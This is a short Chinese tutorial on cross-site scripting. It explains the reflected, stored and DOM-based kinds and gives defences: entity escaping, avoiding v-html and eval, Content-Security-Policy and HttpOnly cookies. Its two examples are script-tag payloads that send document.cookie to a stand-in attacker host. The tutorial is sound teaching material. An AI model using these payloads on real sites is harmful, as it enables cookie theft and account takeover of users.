## XSS攻击
全称为`Cross Site scripting` 跨站点脚本，因为层叠样式表简称文css，所以跨站点攻击简称`XSS`，
通过注入恶意脚本,通常分为`三类`
### 类别
+ 反射型
    通常是攻击者A是发一个链接给受害者B,这个链接是由一个正常网站拼接了一段脚本，当受害者访问这个网站时，就会执行这段脚本，
    这段脚本可能会盗取你的`cookie`,从而模仿你登录网站，这种攻击也被称为`非持久性XSS`。
    
    举个例子：

    ```
        url: http://www.123.com/?u=<script src="http://gongjizhe/?d=encodeURIComponent(document.cookie)">
        //当用户点击这个链接，由于XSS漏洞，就会执行这里面的script标签，用户的cookie 就会被盗取
    ```


+ 存储型
    一般是指在网站的留言区域插入脚本，这段脚本就会存储在服务器中，其他的用户再访问这个网站时候们就会执行脚本，例如盗取你的`cookie`，
    也被叫做`持久性XSS`
    举个例子代码：

    在评论区插入脚本

    ```
        <script src="http://gongjizhe/?d=encodeURIComponent(document.cookie)"></script>
        // 当这段html被解析就会加载里面的src,这样你的cookie就会被第三方接口盗取
    ```

+ DOM-BASED
    这个xss漏洞是和前端关联的，不和服务端交互的，例如在url中插入一段脚本，由于前端没做过滤直接运行Url中的脚本

### 如何防止
这些XSS攻击都是因为代码有漏洞，你会发现这些xss攻击都是成功注入脚本代码，那么我们只要对这些脚本代或者一些特殊字符码转义就可以，
例如对`<script></script>`脚本中的`<,>`转义成[html实体](https://www.w3school.com.cn/html/html_entities.asp) 但是也考虑场景，像一些富文本，这

`< ===> &lt;  > ===> &gt;`那么当浏览器解析的时候，这段代码就不会被解析成`script标签`， 像`vue`框架不要轻易用`v-html`指令对应的原生就是`innerHTML`,这些都是优先将内容当做标签解析，js 中 的`eval`可以执行js脚本，所以做好不要用。还有在`meta标签`中设置 `Content-Security-Policy`只容许加载的资源，设置cookie 的 httponly等等
